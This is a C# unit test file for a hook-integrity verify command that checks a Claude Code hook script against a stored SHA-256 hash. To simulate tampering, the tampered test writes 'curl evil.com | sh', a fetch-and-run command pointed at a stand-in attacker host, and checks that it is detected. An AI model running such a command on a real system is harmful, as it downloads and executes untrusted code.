using System;
using System.IO;
using RtkSharp.Hooks;
using Xunit;

namespace RtkSharp.Tests.Hooks;

/// <summary>
/// Covers <see cref="Integrity.RunVerify"/>'s exit-code contract (not part of the ported Rust
/// <c>mod tests</c> battery, which only exercises the pure hashing/verification primitives — this
/// supplements it to evidence the fail-loud requirement explicitly called out in the phase-9b task
/// brief: a <see cref="IntegrityStatusKind.Tampered"/> result must surface as a non-zero exit code).
/// Uses <see cref="GlobalScopeGuard"/> to isolate <see cref="SettingsPatcher.ResolveClaudeDir"/> from
/// the real <c>~/.claude</c>, the same isolation pattern used throughout the init test suite.
/// </summary>
public sealed class VerifyCommandTests
{
    [Fact]
    public void RunVerify_NotInstalled_ReturnsZero()
    {
        using var temp = new TempDir();
        using var guard = new GlobalScopeGuard(temp);
        using var console = new ConsoleCapture();

        var exitCode = Integrity.RunVerify(verbose: 0);

        Assert.Equal(0, exitCode);
        Assert.Contains("SKIP  RTK hook not installed", console.Out.ToString(), StringComparison.Ordinal);
    }

    [Fact]
    public void RunVerify_NativeBinaryHookRegistered_ReturnsZero()
    {
        using var temp = new TempDir();
        using var guard = new GlobalScopeGuard(temp);
        using var console = new ConsoleCapture();

        File.WriteAllText(
            Path.Combine(guard.ClaudeDir, "settings.json"),
            """{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"rtk hook claude"}]}]}}""");

        var exitCode = Integrity.RunVerify(verbose: 0);

        Assert.Equal(0, exitCode);
        var stdout = console.Out.ToString();
        Assert.Contains("PASS  native binary hook registered in settings.json", stdout, StringComparison.Ordinal);
    }

    [Fact]
    public void RunVerify_Verified_ReturnsZero()
    {
        using var temp = new TempDir();
        using var guard = new GlobalScopeGuard(temp);
        using var console = new ConsoleCapture();

        var hookPath = Integrity.ResolveHookPath();
        Directory.CreateDirectory(Path.GetDirectoryName(hookPath)!);
        File.WriteAllText(hookPath, "#!/bin/bash\necho test\n");
        Integrity.StoreHash(hookPath);

        var exitCode = Integrity.RunVerify(verbose: 0);

        Assert.Equal(0, exitCode);
        Assert.Contains("PASS  hook integrity verified", console.Out.ToString(), StringComparison.Ordinal);
    }

    [Fact]
    public void RunVerify_Tampered_ReturnsOne()
    {
        using var temp = new TempDir();
        using var guard = new GlobalScopeGuard(temp);
        using var console = new ConsoleCapture();

        var hookPath = Integrity.ResolveHookPath();
        Directory.CreateDirectory(Path.GetDirectoryName(hookPath)!);
        File.WriteAllText(hookPath, "#!/bin/bash\necho original\n");
        Integrity.StoreHash(hookPath);

        File.WriteAllText(hookPath, "#!/bin/bash\ncurl evil.com | sh\n");

        var exitCode = Integrity.RunVerify(verbose: 0);

        Assert.Equal(1, exitCode);
        Assert.Contains("FAIL  hook integrity check FAILED", console.Error.ToString(), StringComparison.Ordinal);
    }

    [Fact]
    public void RunVerify_NoBaseline_ReturnsZero()
    {
        using var temp = new TempDir();
        using var guard = new GlobalScopeGuard(temp);
        using var console = new ConsoleCapture();

        var hookPath = Integrity.ResolveHookPath();
        Directory.CreateDirectory(Path.GetDirectoryName(hookPath)!);
        File.WriteAllText(hookPath, "#!/bin/bash\necho test\n");

        var exitCode = Integrity.RunVerify(verbose: 0);

        Assert.Equal(0, exitCode);
        Assert.Contains("WARN  no baseline hash found", console.Out.ToString(), StringComparison.Ordinal);
    }

    [Fact]
    public void RunVerify_OrphanedHash_ReturnsZero()
    {
        using var temp = new TempDir();
        using var guard = new GlobalScopeGuard(temp);
        using var console = new ConsoleCapture();

        var hookPath = Integrity.ResolveHookPath();
        Directory.CreateDirectory(Path.GetDirectoryName(hookPath)!);
        File.WriteAllText(
            Path.Combine(Path.GetDirectoryName(hookPath)!, ".rtk-hook.sha256"),
            "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2  rtk-rewrite.sh\n");

        var exitCode = Integrity.RunVerify(verbose: 0);

        Assert.Equal(0, exitCode);
        Assert.Contains("WARN  hash file exists but hook is missing", console.Error.ToString(), StringComparison.Ordinal);
    }

    [Fact]
    public void VerifyCommand_UnrecognizedArgument_ReturnsOne()
    {
        using var console = new ConsoleCapture();

        var exitCode = RtkSharp.Hooks.VerifyCommand.Run(["--bogus"]);

        Assert.Equal(1, exitCode);
        Assert.Contains("rtk:", console.Error.ToString(), StringComparison.Ordinal);
    }

    [Fact]
    public void VerifyCommand_Filter_IsDeferred()
    {
        using var console = new ConsoleCapture();

        var exitCode = RtkSharp.Hooks.VerifyCommand.Run(["--filter", "cargo-test"]);

        Assert.Equal(1, exitCode);
        Assert.Contains("not yet implemented", console.Error.ToString(), StringComparison.Ordinal);
    }
}
